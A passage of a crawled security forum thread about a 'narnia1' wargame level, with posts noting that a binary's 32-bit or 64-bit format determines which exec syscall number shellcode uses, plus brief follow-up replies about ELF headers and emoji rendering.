      implementation of system calls (syscalls) in its most vanilla form: a
      normal syscall, on the most common architecture: x86_64.  We complete our
      look at syscalls with variations on that...</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>EDIT: What I tried to meant is that you need to look to the type of executable <code>file narnia1</code> instead of looking to the processor. You can run 32bits code in a 64bits processor running a 64bits OS. Many of the sheelcodes you tried are 64bits. And the important thing related to 32/64 bits is that <em>system calls have different id</em> in each platform:</p>
<pre><code>32bits exec -&gt; 0c0b
64bits exec -&gt; 0x3b</code></pre>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="3" />
              <span class='post-likes'>3 Likes</span>
            </div>


            
          </div>
          <div id='post_3' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/pry0cc.html'><span itemprop='name'>pry0cc</span></a>
                (Leader &amp; Offsec Engineer &amp; Forum Daddy)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-07-22T21:41:39Z' class='post-time'>
                    July 22, 2016,  9:41pm
                  </time>
                  <meta itemprop='dateModified' content='2016-07-22T21:41:39Z'>
              <span itemprop='position'>3</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Ha xD It‚Äôs funny how the shellcode matched with the sites emoji function and inserted a <img src="../../../0x00sec.org/images/emoji/twitter/stuck_out_tongue_winking_eyec164.html?v=9" title=":stuck_out_tongue_winking_eye:" class="emoji" alt=":stuck_out_tongue_winking_eye:"> in the code. <img src="../../../0x00sec.org/images/emoji/twitter/laughingc164.html?v=9" title=":laughing:" class="emoji" alt=":laughing:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_4' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/IoTh1nkN0t.html'><span itemprop='name'>IoTh1nkN0t</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-08-16T02:12:23Z' class='post-time'>
                    August 16, 2016,  2:12am
                  </time>
                  <meta itemprop='dateModified' content='2016-08-16T02:12:23Z'>
              <span itemprop='position'>4</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>The way the .text section is interpreted depends on what the ELF header of the file says right? (ELF32 or ELF64)</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_5' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/0x00pf.html'><span itemprop='name'>0x00pf</span></a>
                (pico)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-08-16T08:15:30Z' class='post-time'>
                    August 16, 2016,  8:15am
                  </time>
                  <meta itemprop='dateModified' content='2016-08-16T08:15:30Z'>
              <span itemprop='position'>5</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Your sentence is a bit broader I guess, but, in the context of the discussion in this post. Yes‚Ä¶</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_6' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/system.html'><span itemprop='name'>system</span></a>
                (system)
                  Closed 
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-01-21T00:42:54Z' class='post-time'>
                    January 21, 2018, 12:42am
                  </time>
                  <meta itemprop='dateModified' content='2018-01-21T00:42:54Z'>
              <span itemprop='position'>6</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
    </div>


    




    </div>
    <footer class="container wrap">
  <nav class='crawler-nav'>
    <ul>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../index.html' itemprop="url">Home </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../categories.html' itemprop="url">Categories </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../guidelines.html' itemprop="url">Guidelines </a>
        </span>
      </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../tos.html' itemprop="url">Terms of Service </a>
          </span>
        </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../privacy.html' itemprop="url">Privacy Policy </a>
          </span>
        </li>
    </ul>
  </nav>
  <p class='powered-by-link'>Powered by <a href="../../../external.html?link=https://www.discourse.org/">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>

    
    <script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="../../../external.html?link=http://instant.page/3.0.0" type="module" defer="" integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1" nonce="kt4bHYbkNbDjMboJKLxUYURTP"></script>
  </body>
  
</html>
